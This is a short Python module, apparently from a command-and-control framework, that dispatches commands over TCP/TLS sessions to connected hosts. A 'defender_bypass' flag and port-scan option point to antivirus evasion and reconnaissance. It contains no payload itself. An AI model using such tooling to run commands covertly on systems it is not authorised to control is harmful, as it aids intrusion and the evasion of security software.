import queue
import logging

from core.command_routing.tcp_command_router import TcpCommandRouter
from core.session_handlers import session_manager

logger = logging.getLogger(__name__)

def run_command_tcp(sid: str,
					cmd: str,
					timeout: float = 0.5,
					defender_bypass: bool = False,
					portscan_active: bool = False,
					retries: int = 0,
					op_id: str = "console") -> str | None:
	"""
	Execute `cmd` over a TCP/TLS session identified by `sid`.
	Uses TcpCommandRouter for modular send/receive.
	"""
	session = session_manager.sessions[sid]
	router  = TcpCommandRouter(session)

	# Ensure op_id default
	if not op_id:
		op_id = "console"

	# Flush any stale responses
	router.flush_response(op_id)

	# Atomically sendreceive
	try:
		return router.execute(
			cmd,
			op_id=op_id,
			timeout=timeout,
			portscan_active=portscan_active,
			retries=retries,
			defender_bypass=defender_bypass
		)
	except PermissionError as e:
		print(f"[!] {e}")
		return None

	except queue.Empty:
		logger.debug("TCP execute timeout for sid=%r, op_id=%r", sid, op_id)
		return None
		
	except Exception as e:
		logger.exception("Error in TCP execute for sid=%r, op_id=%r: %s", sid, op_id, e)
		return f"[!] Error: {e}"